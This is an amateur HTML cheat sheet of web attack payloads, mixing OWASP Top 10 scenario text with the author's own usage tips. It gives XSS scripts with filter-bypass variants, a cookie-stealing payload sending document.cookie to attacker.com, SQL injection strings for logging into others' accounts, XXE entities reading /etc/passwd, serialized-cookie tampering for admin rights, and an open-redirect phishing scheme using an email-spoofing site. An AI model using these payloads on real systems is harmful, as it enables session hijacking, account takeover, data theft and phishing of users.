<body style="background-color:black;color:green;">

                         <center><h2>XSS scripts</h2></center>

<p>XSS flaws occur whenever an application includes untrusted data in a new web page without 
proper validation or escaping, or updates an existing web page with user-supplied data using a browser
 API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser 
which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>

          <u> <h4>XSS to steal cookie</h4></u>

<p> 
<b style="color:red;">
<b><</b>script>alert(document.cookie);<b><</b>/script>
</b> 
</p>

<p>this will alert victim's cookie to victim (u can modify it and make cookie store in ur server)</p>

           <u> <h4>XSS reflected </h4></u>

<p>this scripts can be entered anywere ex:username,password,links etc...</p>
<p>this works only when user clicks on links</p>
<p>
<b style="color:red;">
<b><</b>script>prompt(document.cookie);<b><</b>/script>
</b>
</p>
<p>
<b style="color:red;">
<b><</b>script>confirm("this will notify victim");<b><</b>/script>
</b>
</p>
<p>this both will notify victim and similar to the above one(xss to steal cookie)</p>

    <u>  <h5>IF XSS IS IN MEDIUM AND HIGH LEVEL</h5></u>

<p>then use </p>
<p>
<b style="color:red;">
<b><</b>ScRiPt>any scripts<b><</b>/ScRiPt>
</b>
</p>
<p>just use cap letter and small letter and u can also try</p>
<p>
<b style="color:red;">
<b><</b>svg onload=alert("this will just alert u wat u written in bracket")<b>></b>
</b>
</p>

             <u> <h4>XSS stored</h4></u>

<p>this type of xss is more dangerous because it is stored in the server.these scripts 
are entered in comments and etc where the server can store it.</p>
<p>this is dangerous for them who visit the page</p>
<p>
<b style="color:red;">
<b><</b>script>alert(document.domain);<b><</b>/script>
</b>
</p>
<p>this will alert ur domain name</p>
<p>if many script did not run then try this</p>
<p>
<b style="color:red;">
<b><</b>svg onload=alert(document.location);>
</b>
</p>
<p>
Example Attack Scenarios<br>
Scenario #1: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:<br>
<b style="color:red;">(String) page += "<b><</b>input name='creditcard' type='TEXT'<br>
value='" + request.getParameter("CC") + "'>";</b><br>
The attacker modifies the ‘CC’ parameter in the browser to:<br>
<b style="color:red;">'><b><</b>script>document.location=<br>
'http://www.attacker.com/cgi-bin/cookie.cgi?<br>
foo='+document.cookie<b><</b>/script>'.</b><br>
This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.<br>
Note: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.

                           <center><h2>Injection</h2></center>

<u><h4>SQL injuction script</h4></u>
<b style="color:red;"><p>anything' or '1'='1</p></b>
<u><b><h4>injuction</h4></b></u>
<p>Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a 
command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data 
without proper authorization.</p>
<p>Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP,
 XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries.
Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.</p>
<p>ome of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL)
 or Object Graph Navigation Library (OGNL) injection. The concept is identical among all interpreters. Source code review is the
 best method of detecting if applications are vulnerable to injections, closely followed by thorough automated testing of all parameters,
 headers, URL, cookies, JSON, SOAP, and XML data inputs. Organizations can include static source (SAST) and dynamic application
 test (DAST) tools into the CI/CD pipeline to identify newly introduced injection flaws prior to production deployment</p>
<p>Example Attack Scenarios<br>
Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:<br>
<b style="color:red;">String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</b><br>
Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):<br>
<b style="color:red;">Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</b><br>
In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: ‘ or ‘1’=’1. For example:
<b>http://example.com/app/accountView?id=' or '1'='1</b><br><br>

This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data, or even invoke
 stored procedures.</p>
<p>u can also use commands in user name and passwors <br>
ex:<b style="color:red;"> 12' or '1'='1 </b><br>(or use <b style="color:red;">id' or '1'='1</b> in user name or password and then login)</p>
<p>u can acess other users account from this attack</p>

                          <center><h2>XML External Entities (XXE)</h2></center>

<p>Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to
 disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.</p>
<p>
Example Attack Scenarios<br>
Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply
 nested dependencies. The easiest way is to upload a malicious XML file, if accepted:<br>
Scenario #1: The attacker attempts to extract data from the server:
<br>
<u><b>
<b><</b>?xml version="1.0" encoding="ISO-8859-1"?><br>
<b><</b>!DOCTYPE foo [<br>
<b><</b>!ELEMENT foo ANY >
</b></u>
<br><br>
<b style="color:red;">
<b><</b>!ENTITY xxe SYSTEM "file:///etc/passwd" >]><br>
<b><</b>foo>&xxe;<b><</b>/foo>
<br></b>
Scenario #2: An attacker probes the server’s private network by changing the above ENTITY line to:<br>
<b style="color:red;"><b><</b>!ENTITY xxe SYSTEM "https://192.168.1.1/private" <b>></b>]></b><br>
Scenario #3: An attacker attempts a denial-of-service attack by including a potentially endless file:<br>
<b style="color:red;"><b><</b>!ENTITY xxe SYSTEM "file:///dev/random"<b>></b>]></b>
</p>

                                      <center><h2>Broken Access Control</h2></center>
<p>Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these 
flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify 
other users’ data, change access rights, etc.</p>
<p>
Example Attack Scenarios<br>
Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
<br>
<b style="color:red;">pstmt.setString(1, request.getParameter("acct"));<br>
ResultSet results = pstmt.executeQuery( );</b><br>
An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified,
 the attacker can access any user’s account.<br>
<b style="color:red;">http://example.com/app/accountInfo?acct=notmyacct</b><br>
Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.<br>
<b style="color:red;">http://example.com/app/getappInfo<br>
http://example.com/app/admin_getappInfo</b><br>
If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.
</p>

                                         <center><h2>Insecure Deserialization</h2></center>

<p>Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code
 execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.</p>
<p>
Example Attack Scenarios<br>
Scenario #1: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is
 immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the “R00” 
Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.<br>
Scenario #2: A PHP forum uses PHP object serialization to save a “super” cookie, containing the user’s user ID, role, password hash, and other state:<br>
<b style="color:red;">a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";<br>
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</b><br>
An attacker changes the serialized object to give themselves admin privileges:<br>
<b style="color:red;">a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";<br>
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</b><br>
</p>

                                           <center><h2>Unvalidated Redirects & Forwards</h2></center>

<p>this is a type of attack where user is forwaeded or redirected to other pages or fake sites to get users details.</p>
<p>
Example Attack scenarios<br>
Scenario #1:for example lets take a site as facebook.com,the attacker take a link of facebook login page and modify it at the end.<br>
if the link is<br>
<b>htt<b>ps://facebook.</b>com</b><br>
the attacker modify it to<br>
<b>htt<b>ps://facebook.</b>com</b><b style="color:red;">?ReturnUrl=attackers pishing page</b><br>
if attackers pishing page is https://google.com then he may use<br>
<b style="color:red;"><b>htt<b>ps://facebook.</b>com</b><b>?ReturnUrl=https://google.com</b></b>
</p>
<p>Scenario #2:So here if an attacker sends a email using email snoofing site such as <b>http://emkei.cz</b> using social engenering like "u had not loged
 in to site for a long time,please login or eles ur account will be deleated" 
 so that user clicks the link and he will be taken to a original page. and he thinks this site is secure and he logines.but when he clicks on submit
 button he will be Redirected to attackers pishing page.here user will not notice 
the site and logines.and his loogin detailes are stolen. </p>

                                                    <center><h2>CSRF Attack</h2></center>
<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated.
 With a little help of social engineering (such as sending a link via
 email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful
 CSRF attack can force the user to perform state changing requests
 like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.</p><br>
